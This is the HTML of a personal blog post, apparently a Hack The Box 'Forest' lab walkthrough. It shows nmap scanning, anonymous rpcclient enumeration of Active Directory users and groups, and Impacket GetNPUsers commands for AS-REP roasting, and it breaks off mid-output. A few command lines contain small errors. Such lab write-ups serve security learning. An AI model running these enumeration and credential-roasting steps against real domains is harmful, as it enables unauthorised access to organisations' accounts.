<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>Forest | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Forest" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows" /><meta property="og:description" content="Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows" /><link rel="canonical" href="http://localhost:4000/forest/" /><meta property="og:url" content="http://localhost:4000/forest/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/forest/Forest.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-18T18:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/forest/Forest.png" /><meta property="twitter:title" content="Forest" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"Forest","dateModified":"2022-12-18T18:49:38+03:00","datePublished":"2022-12-18T18:49:38+03:00","author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","url":"http://localhost:4000/forest/","description":"Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows","image":"http://localhost:4000/assets/img/forest/Forest.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/forest/"},"@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Forest | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Forest" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows" /><meta property="og:description" content="Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows" /><link rel="canonical" href="http://localhost:4000/forest/" /><meta property="og:url" content="http://localhost:4000/forest/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/forest/Forest.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-18T18:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/forest/Forest.png" /><meta property="twitter:title" content="Forest" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"Forest","dateModified":"2022-12-18T18:49:38+03:00","datePublished":"2022-12-18T18:49:38+03:00","author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","url":"http://localhost:4000/forest/","description":"Enumeration Nmap Scanning. Command 1 └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. ``` Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.19s latency). Scanned at 2022-12-13 08:41:37 EAT for 498s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows","image":"http://localhost:4000/assets/img/forest/Forest.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/forest/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Gemstone-Hashghost</a></div><div class="site-subtitle font-italic">Computer Networks | InfoSec Engineer</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/gemstone-source" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/hashghost21" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['sophiajulius5','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/990235" target="_blank"> <i class="fas fa-cube"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Forest</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Forest</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Dec 18, 2022, 6:49 PM +0300" > Dec 18, 2022 <i class="unloaded">2022-12-18T18:49:38+03:00</i> </span> by <span class="author"> Julius Soraely </span></div></div><div class="post-content"> <img src="/assets/img/forest/Forest.png" class="post-preview-img"><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scanning">Nmap Scanning.</h3><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2
</pre></table></code></div></div><p><strong>Result.</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre># Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.19s latency).
Scanned at 2022-12-13 08:41:37 EAT for 498s
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-13 05:56:06Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2022-12-13T05:56:30
|_  start_date: 2022-12-13T05:19:07
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48432/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55530/udp): CLEAN (Timeout)
|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-12-12T21:56:31-08:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 13 08:49:55 2022 -- 1 IP address (1 host up) scanned in 502.91 seconds
</pre></table></code></div></div><p>The above result shows important details including the presence of important services such as <code class="language-plaintext highlighter-rouge">ldap</code> <code class="language-plaintext highlighter-rouge">winrm</code> and shows the name of the domain which is <code class="language-plaintext highlighter-rouge">htb.local</code> This machine looks like domain controller.</p><p>For better results it is good to test every open port to see if there is any access or any interesting information. Then after testing some initial ports, it turns out out that port <code class="language-plaintext highlighter-rouge">445</code> can be used to provide us some important details. For better understanding check this <a href="https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/">link</a></p><h3 id="enumerate-user-and-group-information-from-the-domain-controllers-with-rpcclient">Enumerate user and group information from the domain controllers with <code class="language-plaintext highlighter-rouge">rpcclient</code></h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/forest]
└─$ 10.10.10.100
rpcclient $&gt; 
</pre></table></code></div></div><ol><li>Enumerate Domain Users<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/forest]
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $&gt; enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
</pre></table></code></div></div></li><li>Enumerate Domain groups.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>rpcclient $&gt; enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
</pre></table></code></div></div><p>Clearly users in this domain are:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">Active Directory</code> there is an option for an account to have the property <code class="language-plaintext highlighter-rouge">Do not require Kerberos preauthentication</code> or <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code> set to <code class="language-plaintext highlighter-rouge">true</code> This does not require the authentication option of kerberos, then we can bruteforce users who has this access by using <code class="language-plaintext highlighter-rouge">Impacket</code></p></li></ol><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/vip/forest/impacket/examples]
└─$ python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/ -usersfile ../../users.txt
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
